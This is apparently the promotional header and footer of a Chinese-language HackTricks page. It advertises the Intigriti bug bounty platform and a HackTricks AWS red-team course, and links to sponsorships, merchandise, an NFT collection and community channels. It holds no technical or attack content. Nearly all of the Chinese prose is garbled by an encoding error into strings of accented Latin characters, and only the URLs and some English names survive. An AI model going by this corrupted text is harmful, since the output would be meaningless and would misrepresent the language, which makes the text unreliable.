**Bugèµé‡‘å°è´´å£«**ï¼š**æ³¨å†Œ** **Intigriti**ï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºï¼Œä¸ºé»‘å®¢æœåŠ¡çš„é«˜çº§**Bugèµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
